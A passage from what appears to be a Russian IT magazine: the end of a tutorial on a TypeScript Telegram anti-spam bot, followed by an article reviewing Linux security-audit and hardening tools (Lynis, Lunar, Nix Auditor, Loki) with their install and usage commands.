разорять. Мы поднимем собственное обла ко для БД с блек‐джеком и про‐
чими атрибутами. Также есть и официальный туториал по установке MongoDB
на «Мак» через тер минал — имен но это я и советую сделать. Заод но и home‐
brew себе поставь, лишним точно не будет.
  На этот момент у тебя должны быть уста новлены:
 • Node.js;
 • Yarn;
 • TypeScript;
 • MongoDB.

Если все установлено и работает, смело продолжай читать туториал. Если
что‐то не получилось, дальше будет слишком тяжко, лучше поправить сейчас.

Тест‑драйв
Типичная вещь, с которой нуж но начинать писать любой проект. Давай про‐
хеллоуворлдим наш технологичес кий стек (или его часть) до начала реаль‐
ного кодинга — чтобы понять, все ли работа ет.
  Создай в любом месте у себя на компьюте ре (у меня есть удобная папочка
~/code, где я держу все про екты) пап ку shieldy_bot и зайди в нее в тер‐
минале. В папке проекта про пиши


$ yarn init

Эта команда задаст тебе ряд вопросов и соз даст проект вмес те с файлом
package.json — это тот самый мас тер‐файл, на который будет смотреть
Node.js при запуске про екта. Обязатель но ука жи dist/index.js в качестве
entry point (точки входа) — чуть позже я рас ска жу зачем.





                 Таким образом я нас троил свой проект

Создай файл index.js в папке dist в папке проекта. Внутри пропиши лишь
одну строку: console.log('Hello world!'). В файл package.json добавь
скрипт start вида node dist/index.js.





               Пример но так дол жен выглядеть проект


             INFO

                      Здесь и далее: команды Unix должны выполняться
                        в папке проекта, если не сказано иначе.


Вперед: запусти команду $ yarn start, и ты должен уви деть Hello world!
в своей консоли. Если так и произошло — успех, Node.js работает! Теперь
проверим TypeScript. Но сна чала установим его пря мо в проект.


$ yarn add typescript

После добавления TypeScript пря мо в проект будет использоваться именно
он, а не тот, что установлен в системе. TypeScript не запускается напрямую
«Нодой», он сначала компилиру ется в JavaScript, а потом компилированный
код и запускается при помощи Node.js. В нашем проекте мы будем хранить
и писать наш код TypeScript в папке src, а компилироваться и запускаться
JavaScript будет в папке dist. Что бы tsc (тулза — компилятор из TypeScript
в JavaScript) работала правильно, ее нуж но нас троить. Добавь в корень про‐
екта файл tsconfig.json со следующим содержанием:


{
  "compilerOptions": {
    "module": "commonjs",
    "target": "es2017",
    "lib": ["es2015"],
    "moduleResolution": "node",
    "sourceMap": true,
    "outDir": "dist",
    "baseUrl": ".",
    "paths": {
      "*": ["node_modules/*", "src/types/*"]
    }
  },
  "include": ["src/**/*"]
}

Вдаваться в подробности, что это за файл и как он работает, я не буду:
это задача вне текущего руководства. Стоит лишь отметить, что мы берем
TypeScript‐файлы из src, кон вертируем в стандарт es2017 и кладем в папочку
dist.
  После удаляем папку dist — она теперь должна генерироваться сама.
Добавляем папку src и кла дем туда уже index.ts с содержанием console.
log('Жизнь  за  Харамби')  (ts — это расширение файлов  TypeScript).
В принципе, любой рабочий JavaScript (JS) — это еще и рабочий TypeScript
(TS), так как TS — это надс тройка над JS.
   Также стоит отметить, что TS — это типизированный язык, в отличие от JS.
Но так как множество пакетов было изна чально написано на JS, сообщество
начало  дополнять  уже  существующие  про екты информацией  о  типах
в репозитории Deﬁnitely Typed, откуда все раз работчики заимствуют типы. Так
и мы сделаем для «Ноды» — выполним команду $ yarn add @types/node.
Если все было правильно, твой проект должен походить на следующий скрин.





                 Добавили шаг компиляции TS

Теперь перед каждым запуском $ yarn start тебе нужно запускать команду
$ tsc, чтобы компилировать код TS в JS. К слову, можно еще и использовать
$ tsc ‐w. Флаг ‐w заставит tsc перекомпилировать файлы, которые изме‐
няются, при их сохранении. Удобно! Но еще удоб нее будет поменять команду
start из package.json на tsc && node dist/index.js — тогда каждый раз
при запуске $ yarn start будет запускаться и tsc.
  Запусти $ yarn start, предварительно добавив или запус тив $ tsc вруч‐
ную. Ты должен увидеть выплюнутую консолью строку «Жизнь за Харамби».
   Если все получилось, то поздравляю: ты нас троил окру жение для раз‐
работки и теперь знаешь, что TypeScript работа ет. Теперь настроим контроль
версий!


Git
Наш механизм Continuous Integration (CI) будет основан на веб‐хуках GitHub.
Запушил в репозиторий — и код сра зу же развернул ся на сервере в продак‐
шене. Поэтому никак нельзя обойти стороной контроль версий.
  Лю бой контроль версий начина ется с правиль ного игнорирования фай‐
лов. Добавь в корне проекта файл с наз вани ем .gitignore и следующим
содержанием:


node_modules
dist
.env

Это позволит избежать коммитов с пакетами из NPM (в идеале они дол жны
устанавливаться теми, кто кача ет репозиторий с кодом), скомпилированным
кодом (он должен компилироваться тем, кто качает репозиторий) и перемен‐
ными окружения, куда мы добавим разного рода информацию, наподобие
местонахождения нашей БД. Информация из .env не дол жна ни в коем слу‐
чае попасть на GitHub, а в зависимос ти от окружения (разработка, тестовый
или боевой сервер) дол жна отличаться.
   Теперь инициализируем репозиторий Git, добавим все файлы в сис тему
контроля версий и закоммитим их следующими командами:


$ git init
$ git add .
$ git commit ‐m "Initial commit"

Думаю, на этом с контролем версий и закончим — главное, не забывай, что
в случае пожара делаем add, commit, push. Также стоит отметить, что, хоть
к «Гиту» мы вернемся только ближе к концу статьи, смело делай commit
и push на свое усмотрение.

Пишем бота‑авто ответчик
Для начала нужно убедить ся, что мы можем написать простейшего бота, —
чтобы после продол жить с более сложным концептом. Первый шаг создания
любого бота для «Телег рама» — это общение с @botfather — отцом всех
ботов. После пары‐тройки несложных манипуляций (уверен, ты справишься)
ты получишь токен бота в следующем виде:


771096498:AAHZOrCZZpdDu1boI6hwf_m3PSYWXKK660M

Если что, этот токен уже не акту ален, так что все же сделай свой. Мы его
добавим в файл .env, который теперь должен выглядеть так:


TOKEN=771096498:AAHZOrCZZpdDu1boI6hwf_m3PSYWXKK660M

.env — это файл для переменных окру жения. Так как мы добавили его в git‐
ignore, он не только не будет загружен на GitHub, но еще и не будет доступен
людям и сервисам, которые захотят клонировать репозиторий. Более того,
контроль версий его вооб ще видеть не будет, так что на разных серверах (и
даже просто в разных папках) ты всегда смо жешь ука зать разные файлы .env.
Например, для тестового сервера и боевого.
   Чтобы заполучить доступ к переменным из этого файла, нам нужно
добавить свой первый пакет зависимос тей. Пропиши в терминале сле‐
дующее:


$ yarn add dotenv @types/dotenv

Теперь у тебя в проекте установлен модуль dotenv с его типами. Стоит отме‐
тить, что сразу несколько пакетов можно устанавливать, указав их через про‐
бел команде $ yarn add. Также типы из Deﬁnitely Typed не обязательно ста‐
вить для каждого пакета зависимос тей — велика веро ятность, что пакеты уже
будут идти со своими типами, прописанными разработчиками. Все‐таки Type‐
Script уже давно на рынке и успел понравиться мно гим.
  Перепишем наш index.ts следующим обра зом:


// Зависимости
import * as dotenv from 'dotenv'
// Настраиваем dotenv
dotenv.config({ path: `${__dirname}/../.env` })
// Принтим токен
console.log(process.env.TOKEN)


             INFO

                      Здесь и далее я подразумеваю, что ты запус‐
                      каешь и тестируешь свой код, сначала ском‐
                      пилировав его при помощи команды $  tsc,
                       а потом запустив с $ yarn start.


После запуска твоя кон соль должна выдать такую строчку:


771096498:AAHZOrCZZpdDu1boI6hwf_m3PSYWXKK660M

Если это так, то все в ажуре — перехо дим к непос редственному написанию
бота. Использовать мы будем библиотеку Telegraf, она на данный момент
самая продвинутая. Поставим ее командой $ yarn add telegraf — типы
ставить не нужно, они идут в пакете с основным кодом.
  Изменим наш index.ts на что‐то такое:


// Зависимости
import * as dotenv from 'dotenv'
import { Telegraf, ContextMessageUpdate } from 'telegraf'
const telegraf = require('telegraf')
// Настраиваем dotenv
dotenv.config({ path: `${__dirname}/../.env` })
// Создаем бота
const bot: Telegraf<ContextMessageUpdate> = new telegraf(process.env.
TOKEN)
// Отвечаем тем же текстом, что и был прислан
bot.on('text', ctx => {
  ctx.reply(ctx.message.text)
})
// Включаем бота
bot.startPolling()

Давай разберем код и пос мотрим, что же он дела ет.
 1. Импортируем все зависимости, с которы ми будем работать. Здесь важно
   отметить, что из‐за неидеальности типов Telegraf нам приходится не толь‐
   ко импортировать дополнительный тип ContextMessageUpdate , но и
  сам telegraf импортировать олдскульным require, поэтому нам при‐
   ходится ручками прописывать тип у переменной bot. Обычно TypeScript
   угадывает типы автоматически.
 2. Импортируем все переменные из файла .env, чтобы можно было их
   использовать в фор мате process.env.*имя переменной*.
 3. Создаем объект самого бота, который и будет отве чать на наши сооб‐
   щения, используя токен из .env.
 4. При помощи встроенного синтаксиса Telegraf мы говорим боту: когда
   получаешь сообщение текстом, ответь тем же текстом пользовате лю.
 5. Вклю чаем бота, чтобы тот время от времени проверял сервер «Телег‐
   рама» на предмет новых сообщений.

Запустив этот код, ты получишь рабочего бота, который умеет… пока что
только передразнивать пользователя.





            Подоб ный бот у тебя дол жен был получиться

Дальше я не стану приводить длинные выкладки кода: просто буду говорить,
куда и что добав лять. Поэтому будь внимателен!

Ро бот‑вышибала
Идея, которую мы реализуем, очень прос та: когда человек заходит в чат, бот
ему говорит, что у него 60 секунд, что бы что угодно написать в чат — хоть сти‐
кер, хоть команду, хоть фоточку. Если человек в течение минуты ничего
не прислал, то мы кикаем его из группы.
  Пока что не будем заморачивать ся с переза пус ком бота и сохранением
состояний, просто будем держать список кандидатов на бан в памяти, а каж‐
дую секунду проверять, не нуж но ли кого‐то забанить.
   Где‐нибудь вверху добавь переменную chats со следующей сигнатурой:


const chats = {} as {
  [index: number]: { id: number; time: number }[]
}

Эта басурманская вязь — объявление типа объекта до его непосредствен‐
ного использования. У нас будет объект идентификаторов чатов к спис ку кан‐
дидатов на бан в этом чате. У каждого кандидата на бан будет идентификатор
от «Телеграма» и время, когда он зашел. Конечно, чище будет использовать
интерфейсы — но это поз же.
   Теперь дело в шляпе — нужно просто смотреть, как люди заходят в чат,
добавлять их в список кандидатов на бан, убирать, если будет замечена их
активность в этом чате, и банить кандидатов‐молчунов. Не забудь убрать блок
кода, который заставляет бота отвечать тем же сообщением пользователям,
и допиши следующие команды:


// Добавляем в кандидаты по приходу
bot.on('new_chat_members', ctx => {
  for (const member of ctx.message.new_chat_members) {
    addCandidate(ctx.chat.id, member.id)
    ctx.reply('Пожалуйста, пришлите любое сообщение в этот чат в
течение 60 секунд, или вы будете забанены')
  }
})
// Удаляем из кандидатов по активности
bot.on('message', ctx => {
  removeCandidate(ctx.chat.id, ctx.from.id)
})

Объект ctx (от сло ва context) — это очень важная штука, в которой есть вся
значимая для тебя информа ция. Нам нужен список новоприбывших, иден‐
тификатор чата и идентифика тор пользователя, который прислал сообщение.
Как ты уже мог догадаться, мы добавляем имплементацию функций addCan‐
didate и removeCandidate.


// Добавляем кандидата
function addCandidate(chatId, candidateId) {
  const candidate = {
    id: candidateId,
    time: new Date().getTime(),
  }
  let candidates = chats[chatId]
  if (candidates) {
    candidates.push(candidate)
  } else {
    candidates = [candidate]
  }
  chats[chatId] = candidates
}
// Убираем кандидата
function removeCandidate(chatId, candidateId) {
  let candidates = chats[chatId]
  if (!candidates) return
  chats[chatId] = candidates.filter(candidate => candidate.id !==
candidateId)
}

В принципе, здесь все прос то — как только человек приходит в чат, мы соз‐
даем ему объект кандидата с его идентификатором и вре менем, когда он
пришел. После мы  либо  достаем  существу ющий  массив  кандидатов
для определенного чата и добавляем туда нашего кандидата, либо создаем
новый массив сразу же с кандидатом — а после воз вращаем новый массив
в объект идентификаторов чата к кандидатам.
   Убирать кандидатов еще проще — мы получаем список кандидатов
для чата. Если его нет — все хорошо, кандидата и убирать не надо. Если есть,
то мы фильтруем массив кандидатов.
  После нам остается лишь добавить таймер, который раз в секунду будет
проверять, не нужно ли кого‐нибудь снова забанить. Добавляем следующий
код:


// Проверяем, нужно ли банить
setInterval(() => {
  for (const chatId in chats) {
    const candidates = chats[chatId]
    if (!candidates.length) continue
    const now = new Date().getTime()
    for (const candidate of candidates) {
      if (candidate.time < now ‐ 60 * 1000) {
        const telegram = bot.telegram as any
        telegram.kickChatMember(chatId, candidate.id)
        removeCandidate(chatId, candidate.id)
      }
    }
  }
}, 1000)

Каждую секунду мы запускаем эту функцию. Она проходится по всем иден‐
тификаторам чатов из нашего объекта чатов с кандидатами. Если кандидатов
нет, то просто пропускает этот чат. Ина че — про ходится по всем кандидатам
и сверяет, не зашел ли кто‐то из них более 60 секунд назад. Если это так, то
банит и убирает из списка кандидатов.
   Вот и все — можешь запускать бота, добавлять его в любой чат с админ‐
скими правами и забыть про спа меров!
АДМИН





                                                                           Иван Пискунов



ЖЕСТКАЯ ЗАКАЛКА
   LINUX

        ПОДБИРАЕМ ИНСТРУМЕНТЫ
 ДЛЯ КОМПЛЕКСНОГО АУДИТА БЕЗОПАСНОСТИ




В этом материале мы познакомимся с основными утилитами
для Linux hardening. На русском языке это называется как‐то
вроде  «провер ка  уровня  защищен ности  Linux‐систем
и оценка кор ректности кон фигов с  точки зрения ИБ».
Разумеется, мы не только сделаем обзор программ, но и
приведем примеры их использования.


САМ СЕБЕ АУДИТОР, ИЛИ БЕЗОПАСНОСТЬ СОБСТВЕННЫМИ
СИЛАМИ
Перед администраторами, а уж тем более перед аудиторами ИБ часто встают
задачи проверить защищенность большого количества хостов за очень
короткое время. И конечно, для решения этих задач в Enterprise‐сегменте
существуют специализированные инс трументы, к примеру такие, как се тевые
сканеры безопасности. Уверен, что все они — от open sources движка Open‐
VAS до коммерческих продуктов типа Nessus или Nexpose — известны
нашему читателю. Однако этот софт обычно исполь зуется, чтобы искать уста‐
ревшее и потому уязвимое ПО и затем запус тить патч‐менеджмент. К тому же
не все сканеры учитывают некоторые специфические особенности встро‐
енных механизмов защиты Linux и дру гих open sources продуктов. Ну и не
в последнюю очередь значение имеет цена воп роса, ведь коммерческие
продукты в состоянии поз волить себе раз ве что компании, выделяющие
под это дело бюджеты.
  Именно поэтому сегодня речь пойдет о специализированном наборе сво‐
бодно распространяемых утилит, которые могут диагностировать текущий
уровень защищенности системы, оценить потенциальные риски, к при меру
«лишние сервисы», торчащие в интернет, или небезопасный конфиг по умол‐
чанию, и даже предложить варианты исправления найденных недостатков.
Еще одно пре имущество использования этих тулз заключается в воз можнос‐
ти тиражировать типовые сценарии проверки фермы из любого количества
Linux‐систем и формировать документально подтвержденную базу тестов
в виде логов и отдельных репортов.


ПРАКТИЧЕСКИЕ АСПЕКТЫ АУДИТА ЗАЩИЩЕННОСТИ
Если посмотреть глазами аудитора, то подход к тес тированию можно раз‐
делить на два типа.
  Первый — это соот ветствие так называ емым compliance‐тре бованиям,
здесь проверяется наличие обязатель ных элементов защиты, прописанных
в каком‐либо международном стандарте или «best practice». Клас сический
пример — тре бования PCI DSS для платеж ных ИТ‐систем, SOX404, NIST‐800
series, MITRE.
  Вто рой — это сугубо рациональный подход, основанный на вопросе «А
что еще можно сделать, чтобы усилить защищенность?». Тут нет обя затель‐
ных требований — только твои зна ния, светлая голова и умелые руки. К при‐
меру, это обновление версии ядра и/или пакетов приложе ний, включение
шифрования томов, форсирование SELinux, настройка файрвола iptables.
   Все, что относится ко второму подходу, при нято называть специальным
термином Hardening, что еще можно определить как «действия, направлен‐
ные на усиление уровня исходной защищенности операци онной системы
(или программы) преимущественно штатными средс твами».
  Соответствие compliance‐требованиям, как правило, проверяют при под‐
готовке к прохождению обязательного аудита типа PCI DSS или другого сер‐
тификационного аудита. Мы же больше уделим внимание Hardening‐сос‐
тавляющей. Все крупные разработ чики предлагают для своих продуктов Hard‐
ening  Guidelines — руководства, содержащие советы и рекомендации,
как усилить защищенность, учитывая штатные механизмы безопас ности
и специфику софта. Так, подоб ные руководс тва есть у Red Hat, Debian,
Oracle, Cisco.


             INFO

                        Hardening — это термин из мира ИБ, который
                      обозначает процесс обеспечения безопасности
                       системы (программы) за счет снижения ее уяз‐
                      вимости и, как пра вило, с использованием только
                       штатных утилит или механизмов защиты.


Кстати, на Хакере уже была схожая статья про нас тройку опций Hardening,
но тогда речь шла именно о нас тройке. Мы же сна чала почекаем нашу сис‐
тему с помощью специальных утилит, то есть про ведем аудит ИБ, оце ним
текущий уровень защиты, а потом уже накрутим туда security option, если
необходимо. Ну или еще как вариант: если сервер уже оттюнингован с точки
зрения безопасности, наши тулзы смогут это проверить и, воз можно, под ска‐
зать, что же можно сделать еще.


ОБЗОР ИНСТРУМЕНТОВ
1. Lynis — auditing, system hardening, compliance testing
Lynis — первая в нашем списке инстру ментов и, пожалуй, самая наворочен‐
ная тул за для аудита Linux‐систем. При этом она очень простая в исполь‐
зовании и очень наглядная — все тес ты и их резуль таты выводятся на экран.
Утилита сканирует настройки текущего уровня безопасности и опре деля ет
состояние защищен ности (hardening state) машины. Найденные тре вожные
сигналы и важные алерты безопасности выводятся в консоль терминала
и отдельно в лог‐файл, сгруппированные по блокам. Кроме сведений
о безопасности, Lynis также поможет получить общесистемную информацию,
информацию об установленных пакетах и воз можных ошибках конфигурации,
обновлениях ядра.
   Разработчиками заявлена поддержка огромного чис ла операционных сис‐
тем: от Arch, BackTrack, Kali до раз новидностей Debian/Ubuntu, RHEL/CentOS,
SuSE, BSD‐семейства (FreeBSD, NetBSD, OpenBSD, DragonFly BSD), а также
более экзотичных HPUX, Solaris 10+, TrueOS и macOS.
   Вся документация с более подробным описанием и при мерами исполь‐
зования доступна в разделе Lynis Documentation на официальном сайте
CISOfy. Если не хочешь огра ничиваться предлага емы ми тес тами, есть воз‐
можность разработки собственных. Более подробно об этом написано в раз‐
деле Lynis Software Development Kit. Ну и для тех, кто еще сомневается, уста‐
навливать или нет утилиту, разработ чики подготовили небольшое demo,
поясняющее, как происходит установка и первичный запуск.
  Кроме бесплатной версии, которую мы и будем чуть ниже использовать,
разработчики предлагают решение Enterprise‐уровня. В этом случае к стан‐
дартной поставке добавляется веб‐интерфейс для админис трирования,
опциональные дашборды, дополнитель ная документация (hardening snippets)
и развернутый план кор ректировки выявленных наруше ний. И это еще не все,
данное решение ко всему прочему мож но получить в виде облачного сервиса
(Software‐as‐a‐Service).





                           Logo CISOfy

Lynis выполняет  сотни отдельных  тестов,  чтобы определить состояние
защищенности  системы.  Сама  про верка  защищенности  заключается
в выполнении набора шагов от инициализации программы до генерации
отчета.
  Поскольку  Lynis весь ма гибкий и многоп рофильный инструмент, она
используется для различных целей. К примеру, типовые варианты исполь‐
зования Lynis вклю чают:
 • аудит безопасности (типовой сценарий, задаваемый пользовате лем);
 • тестирование на соот ветс твие требованиям (нап ример, PCI DSS, HIPAA,
   SOX404, OpenSCAP, NSA);
 • обнаружение уязвимостей (устаревшее ПО);
 • режим Penetration testing (попытка эскалации привилегий);
 • улучшение системы (незадействованные тви ки ядра, демонов и прочего).

Установить утилиту можно несколькими способа ми — как с помощью заг‐
рузки из хранилища GitHub:


git clone https://github.com/CISOfy/lynis
cd lynis
./lynis

так и установкой из репозитория Debian/Ubuntu:


sudo apt‐get update
sudo apt‐get install lynis

И для RPM‐ориентированных дистрибутивов (предварительно добавив соот‐
ветствующие репозитории):


yum install linus ‐y

Установка на macOS:


$ brew search lynis
$ brew install lynis

Чтобы запустить Lynis, достаточно указать хотя бы один ключ. К примеру,
для запуска всех имеющихся тес тов следует ука зать ключ ‐c (check all, про‐
верить все):


# Типовой набор тестов
sudo lynis audit system
# Полный набор тестов
sudo lynis audit system ‐c
# Сканирование удаленного хоста
audit system remote <host>





                     Инициализация тес тов





       Результаты тес тов из группы System Tool and Boot & Services





     Результаты тестов из группы Kernel and Memory & Process auditing





       Результаты тестов из группы User and Group & Authentication

Перед аудитом всегда полезно проверить, доступна ли новая версия Lynis:


lynis update info && lynis update check

У утилиты Lynis, помимо стандартного, сущес твует еще один режим — неп-
ривиле гиро ван ного запуска:


lynis audit ‐‐pentest

Если же ты хочешь помес тить имя ауди тора, запустившего тестирование,
просто добавь параметр ‐auditor <name>:


sudo lynis audit system ‐c ‐auditor Daddy

На любом этапе аудита про цесс проверки может быть продолжен (Enter) либо
принудительно прекращен (Ctrl+C). Результаты выполненных тестов будут
писаться в журнал Lynis в /var/log/lynis.log. Учти, что журнал будет
перезаписываться при каждом следующем запуске утилиты.
  Для тестирования на систематической основе в автоматическом режиме
можно назначить соот ветству ющее задание в планировщик Cron с помощью
клю ча ‐cronjob. В таком случае утилита будет запускаться по заданному
шаблону (конфигу) и не будет выводить никаких интерактивных сообщений,
вопросов и пре дупреждений. Все результаты сохранятся в лог. К примеру,
вот скрипт запуска утилиты с дефолтным конфигом раз в месяц:


#!/bin/sh
AUDITOR="automated"
DATE=$(date +%Y%m%d)
HOST=$(hostname)
LOG_DIR="/var/log/lynis"
REPORT="$LOG_DIR/report‐${HOST}.${DATE}"
DATA="$LOG_DIR/report‐data‐${HOST}.${DATE}.txt"
cd /usr/local/lynis
./lynis ‐c –auditor "${AUDITOR}" –cronjob > ${REPORT}
mv /var/log/lynis‐report.dat ${DATA}
# End

Сохрани этот скрипт в каталог /etc/cron.monthly/lynis. И не забудь
добавить пути для сохранения логов (/usr/local/lynis и /var/log/lynis),
иначе возможна некорректная работа.
  Можно посмотреть список всех дос тупных для вызова команд:


lynis show commands





                  Вывод доступных команд

Особо любопытные могут глянуть нас тройки из конфига по умолчанию:


lynis show settings

Краткий инструктаж по работе с утилитой:


 man lynis

Варианты возможных статусов по результатам проверки ограничиваются сле‐
дующим списком: NONE, WEAK, DONE, FOUND, NOT_FOUND, OK,
WARNING.





                    Пример вывода ста тусов


Запуск отдельных тестов в Lynis
На практике бывает необ ходимо провес ти лишь некоторые тесты. К примеру,
если твой сервак выполняет только функции Mail Server или Apache. Для этого
мы можем использовать параметр ‐tests. Синтаксис команды выглядит сле‐
дующим образом:


lynis ‐tests "Test‐IDs"

Если тебе сложно разобрать ся из‐за большого количества идентификаторов
тестов, то ты можешь использовать групповой параметр ‐test‐category.
С помощью данной опции Lynis запускает идентификаторы только тех тестов,
которые входят в определенную категорию. Например, мы планируем запус‐
тить тесты брандмауэра и ядра:


./lynis ‐tests‐category "firewalls kernel"





                 Пример запус ка отдельных тестов

Список всех доступных тестов можно пос мотреть в разделе Controls.
  Помимо этого, функциональность Lynis рас ширя ют различные плагины,
которые можно дописы вать самос тоятельно, а можно подкладывать новые
в существующую директорию.


Пред ложения по исправлению (Suggestions)
Все предупреждения (Warnings) будут перечислены пос ле результатов. Каж‐
дое начинается с текста предупреждения, потом рядом в скобках указывается
тест, который его сгенерировал. В следующей строке предлагается решение
проблемы, если оно существует. По факту последняя строка — это URL‐
адрес, по которому ты сможешь посмотреть подробности и найти допол‐
нительные рекомендации, как устранить возникшую проблему.





       Вывод рекомендаций, как устранять найденные проблемы


Про фили
Профили, которые управляют аудитом, определяются в файлах с расширени‐
ем  .prf, расположен ных в катало ге /etc/lynis. Профиль по умолчанию
называется предсказуемо: default.prf. Раз работчики не рекомендуют пра‐
вить его напрямую: любые изменения, которые ты хочешь внести в аудит, луч‐
ше добав лять в файл custom.prf, находящийся в том же каталоге.
  Создаем и редактируем кастомный про филь:


touch /etc/lynis/custom.prf
sudo nano /etc/lynis/custom.prf

В этом файле можно определить список тес тов, которые нужно исключить
из аудита Lynis. Например:
 • FILE‐6310: проверка раз делов;
 • HTTP‐6622: тест установки nginx;
 • HTTP‐6702: тест установки Apache.

Чтобы исклю чить какой‐то определенный тест, используй директиву skip‐test
и укажи ID теста. Например, так:


# Is nginx installed?
skip‐test=HTTP‐6622
# Is Apache installed?
skip‐test=HTTP‐6702


Оцен ка hardening state
По результатам выполнения всех тестов в конце каждого вывода аудита ути‐
литы (чуть ниже раздела предложений) ты най дешь раздел, который будет
выглядеть приблизительно следующим образом:


Lynis security scan details:
Hardening index : 57 [############.........]
Tests performed : 216
Plugins enabled : 0





                   Ито говая оценка hardening state




                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
    ЖЕСТКАЯ ЗАКАЛКА
               LINUX
                     ПОДБИРАЕМ ИНСТРУМЕНТЫ
                    ДЛЯ КОМПЛЕКСНОГО АУДИТА
                             БЕЗОПАСНОСТИ




Этот результат, выраженный числом, показывает количес тво пройденных тес‐
тов и индекс безопасности системы, то есть hardening index — итоговое
число, с помощью которого Lynis оценива ет общий уровень безопасности
сервера. И очень важно не забывать, что индекс безопасности изменяется
в зависимости от количес тва исправленных предуп режде ний и реализован‐
ных рекомендаций  Lynis. Поэтому пос ле фиксов повторный аудит может
показать совсем другое число!


           WARNING

                 Любые манипуляции с системой в режиме супер‐
                       пользовате ля  требуют  пристального  внимания
                      и повышенной ответственности. Выполняй только
                         те действия, которые осознаешь и в которых
                        твердо  уверен.  Не  пренебрегай  резервными
                       копиями и снапшотами.



2. Lunar — a UNIX security auditing tool based on several security
frameworks
Lunar — это набор нативных скриптов, написанных на язы ке командной обо‐
лочки  bash,  которые  тестиру ют  целевую  Linux‐машину  и  генерируют
по результатам проверки заключение ауди та безопасности. Тул за основана
на стандартах CIS и дру гих мировых фреймворках по безопасности. Заявлена
поддержка всех популярных систем: Linux — RHEL и CentOS с версии 5, SLES
начиная с версии 10, Debian/Ubuntu, Amazon Linux, Solaris с версии 6, macOS
(последние билды), FreeBSD (час тично), AIX (час тично) и даже ESXi.





                        Логотип Lunar

Кроме прочего, данная утилита поддерживает облачную платформу Amazon
Web Services (AWS) и контейнеры Docker. Подробное описание всех фич,
а также примеры запуска утилиты и инициации тестов приведены в докумен‐
тации Wiki на GitHub.





              Просмотр всех параметров запуска Lunar

Запуск в режиме аудита, то есть без вне сения изме нений в систему:


 ./lunar.sh ‐a

Запуск в режиме аудита и предоставления боль шей информации:


./lunar.sh ‐a ‐v

Перечислить тесты:


./lunar.sh ‐S

Выпол нять только тесты на осно ве обо лочки:


./lunar.sh ‐s audit_shell_services

Запуск в режиме исправления, то есть с вне сением изме нений в сис-
тему:


 ./lunar.sh ‐l

Просмотр предлагаемых изменений (твиков) сис темы до их вне сения в кон‐
фиги:


./lunar.sh ‐d





           Пример запус ка тес тов для web‐сервера Apache


3. Nix Auditor — a CIS Audit made easier
Nix Auditor — это еще один скрипт для проверки, соответствует ли безопас‐
ность Linux‐систем требова ниям бенчмарка CIS. Ориентирован на RHEL,
CentOS и прочие RPM‐дистрибутивы.
   Разработчики заявляют о таких преимуществах Nix Auditor:
 • скорость сканирования — провес ти базовую проверку ОС можно менее
   чем за 120 секунд и тут же получить отчет;
 • точность проверки — работа утилиты про верена на разных версиях дис‐
   трибутивов CentOS и Red Hat;
 • настраиваемость — исходники с докумен тацией  к программе лежат
   на GitHub, поэтому код легко нас траивается в соответствии с типом ОС
   и набором элементов системы, которые необ ходимо проверить;
 • простота  исполь зования —  достаточно  сделать  стартовый  скрипт
   исполняемым, и тот готов к проверке.

Пример выполнения команд для загрузки утилиты с GitHub‐хранилища и пос‐
ледующего запуска скрипта:


git clone https://github.com/XalfiE/Nix‐Auditor.git
cd Nix‐Auditor
chmod +x nixauditor
./nixauditor





         Пример вывода информа ции после запус ка Nix Auditor


4. Loki — Simple IOC and Incident Response Scanner
Утилита Loki — не совсем клас сический инс трумент для проведе ния ауди та
ИБ, однако отлично под ходит для поиска следов взлома, что отчасти можно
отнести и к практике аудита.





                     Логотип Loki Scanner

По заверениям разработчиков, вот такие возможности дает нам их тул за:
    I. Четыре спо соба выявления взло ма:
 • имена файлов (соот ветствие регулярному выражению полного пути фай‐
   ла);
 • проверка в соответствии с пра вила ми Yara (поиск на соответствие сиг‐
   натурам Yara по содержимому файлов и памяти процес сов);
 • проверка хешей (сравнение просканированных файлов с хешами (MD5,
   SHA‐1, SHA‐256) извес тных вредонос ных фай лов);
 • проверка обратной связи C2 (сравнивает конечные точки технологичес‐
   кого соединения с C2 IOC).

II. Допол нительные про верки:
 • проверка файловой системы Regin (через ‐‐reginfs);
 • проверка аномалий системных и пользовательских процес сов;
 • сканирование распакованных SWF;
 • проверка дампа SAM;
 • проверка DoublePulsar — попытка выявить бэкдор DoublePulsar, слу‐
  шающий порты 445/tcp и 3389/tcp.

Чуть‐чуть коснемся того, как Loki определяет факт компрометации. Типовы ми
признаками (Indicators of Compromise), свидетель ствующими, что компьютер
был скомпрометирован (то есть взломан), могут быть:
 • появление на компьютере malware (вирусов, бэкдоров, троянов, кейлог‐
   геров, крипторов, майнеров и так далее), а также хакерских утилит (нап‐
   ример, для иссле дования сети, экс плуатации уязвимостей, сбора учетных
   данных);
 • появление неизвестных новых исполняемых и других файлов, даже если
   они не детектируются антивирус ным движком как malware‐код;
 • аномальная сетевая активность (подключение к удаленным хос там, откры‐
   тие для прослушивания портов неизвес тными программами и прочее);
 • аномальная активность на дисковых устрой ствах (I/O) и повышенное пот‐
   ребление ресурсов системы (CPU, RAM, Swap).

Перед началом  инсталляции нужно доус тановить нес колько зависимых
пакетов. Это colorama (дает расцветку строк в консоли), psutil (утилита про‐
верки процессов) и, если еще не уста новлен, пакет Yara.
   Итак, приступаем. Установка в Kali Linux (предварительно должен быть
установлен пакет Yara, который по умолчанию уже инстал лирован в Kali Linux):


sudo pip2 install psutil netaddr pylzma colorama
git clone https://github.com/Neo23x0/Loki
cd Loki/
python2 loki‐upgrader.py
python2 loki.py ‐h

Установка в Ubuntu/Debian:


sudo apt‐get install yara python‐yara python‐pip python‐setuptools
python‐dev git
sudo pip2 install ‐‐upgrade pip
sudo pip2 install ‐U setuptools
sudo pip2 install psutil netaddr pylzma colorama
git clone https://github.com/Neo23x0/Loki
cd /home/download/Loki
python2 loki‐upgrader.py
python2 loki.py ‐h

Установка в BlackArch:


sudo pacman ‐S yara python2‐pip python2‐yara
sudo pip2 install psutil netaddr pylzma colorama
git clone https://github.com/Neo23x0/Loki
cd /home/download/Loki
python2 loki‐upgrader.py
python2 loki.py ‐h


Пример использования
  Некоторые опции запуска:


optional arguments:
  ‐h, ‐‐help      show this help message and exit
  ‐p path         Path to scan
  ‐l log‐file     Log file
  ‐‐printAll      Print all files that are scanned
  ‐‐noprocscan    Skip the process scan
  ‐‐nofilescan    Skip the file scan
  ‐‐noindicator   Do not show a progress indicator
  ‐‐reginfs       Do check for Regin virtual file system
  ‐‐onlyrelevant  Only print warnings or alerts
  ‐‐nolog         Don't write a local log file





                      Loki Scanner после первого запуска

